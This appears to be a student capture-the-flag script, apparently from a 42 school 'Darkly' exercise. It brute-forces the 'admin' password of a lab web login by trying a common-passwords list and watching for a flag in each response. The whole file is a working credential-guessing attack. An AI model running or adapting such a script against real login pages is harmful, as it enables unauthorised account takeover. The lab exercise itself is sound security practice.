import requests

url = "http://10.14.200.42/index.php"
username = "admin"
password_file = "/home/wmonacho/Documents/Project_42/In_Progress_Project/darkly/login_brut_force/Ressources/100-most-common-passwords.csv"

def try_password(username, password):
    print(f"Test du mot de passe : {password}")
    params = {
        "page": "signin",
        "username": username,
        "password": password,
        "Login": "Login"
    }
    response = requests.get(url, params=params)
    if "flag" in response.text:
        for line in response.text.splitlines():
            if "flag" in line:
                print(f"[+] Mot de passe trouvé : {password}")
                print(f"[+] Ligne contenant le flag : {line}")
                return True
    return False

def test():
    with open(password_file, "r") as file:
        for line in file:
            password = line.strip().split(",")[1] if "," in line else line.strip()
            if try_password(username, password):
                break

test()